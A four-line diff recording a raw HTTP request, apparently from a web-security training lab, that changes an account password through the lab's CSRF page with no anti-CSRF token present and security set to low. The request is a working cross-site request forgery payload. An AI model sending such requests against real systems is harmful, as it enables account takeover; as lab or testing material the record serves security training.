@@ -1,0 +1,4 @@
+GET /vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change HTTP/1.1
+Host: 10.31.0.87:3000
+Cookie: PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=low
+NO user_token present
